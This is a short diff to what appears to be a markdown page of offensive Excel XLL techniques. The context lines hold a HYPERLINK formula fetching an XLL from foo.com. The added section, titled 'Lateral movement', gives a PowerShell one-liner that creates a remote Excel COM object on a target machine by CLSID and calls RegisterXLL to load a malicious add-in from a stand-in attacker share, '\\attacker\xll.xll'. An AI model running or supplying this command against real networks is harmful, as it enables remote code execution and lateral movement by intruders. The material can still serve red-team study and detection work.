@@ -37,4 +37,9 @@ Embedded in the Worksheet (xll cant be found)
 ```
 =HYPERLINK("http://foo.com/xll.xll", "CLICK")
 ```
+#### Lateral movement from @buffaloverflow
+```
+PS>[activator]::CreateInstance([type]::GetTypeFromCLSID("{CLSID}, tgt")).RegisterXLL("\\attacker\xll.xll")
+```
+
 
